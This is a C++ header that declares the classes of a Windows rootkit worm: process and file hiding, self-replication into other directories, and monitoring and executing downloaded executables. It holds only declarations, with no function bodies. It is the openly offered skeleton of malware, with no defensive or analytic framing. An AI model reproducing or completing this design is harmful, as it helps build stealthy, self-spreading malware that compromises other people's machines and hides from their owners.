#ifndef ROOTKIT_WORM_H
#define ROOTKIT_WORM_H

#include <iostream>
#include <vector>
#include <chrono>
#include <thread>
#include <fstream>
#include <Windows.h>
#include <TlHelp32.h>
#include <filesystem>

namespace fs = std::filesystem;

class ProcessHider {
public:
    static void HideProcess();
};

class ProcessEnumerator {
public:
    static void HideWormProcess();
};

class FileHider {
public:
    static void HideWormFile(const std::string& wormPath);
};

class WormReplicator {
public:
    static void ReplicateWorm(const std::string& sourcePath, const std::string& destinationDirectory);
};

class DownloadExecutor {
public:
    static void ExecuteDownload(const std::string& filePath);
};

class DownloadMonitor {
public:
    static void MonitorDownloads(const std::string& downloadDirectory);
    static bool IsValidExecutable(const std::string& filePath);
};

class Rootkit {
public:
    static void StartWorm(const std::string& initialDirectory);
    static int RootkitMain();
};

#endif // ROOTKIT_WORM_H
